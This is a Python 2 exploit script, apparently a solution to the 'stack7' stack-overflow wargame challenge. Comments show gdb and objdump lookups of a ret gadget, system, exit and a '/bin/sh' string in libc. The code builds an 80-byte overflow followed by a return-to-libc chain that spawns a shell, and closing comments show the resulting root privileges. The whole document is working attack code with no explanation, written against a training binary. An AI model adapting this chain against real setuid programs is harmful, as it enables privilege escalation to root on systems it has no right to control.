#!/usr/bin/env python

# objdump -d stack7 | grep ret

#8048383   c3     ret 

#(gdb) print system
# $1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>


#(gdb) print exit
#$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>


#(gdb) info proc map

#0xb7e97000 0xb7fd5000   0x13e000  0    /lib/libc-2.11.2.so
 
#  x/s 0xb7e97000 + 0x011f3bf


#0xb7fb63bf



import struct

offset = "A"*80


ret_address = struct.pack('I',0x08048383)


system_address = struct.pack('I',0xb7ecffb0)


Exit_system = struct.pack('I',0xb7ec60c0)


bin_Sh = struct.pack('I',0xb7fb63bf)


execute = offset + ret_address + system_address + Exit_system + bin_Sh

print execute 




#id
#uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
#whoami
#root




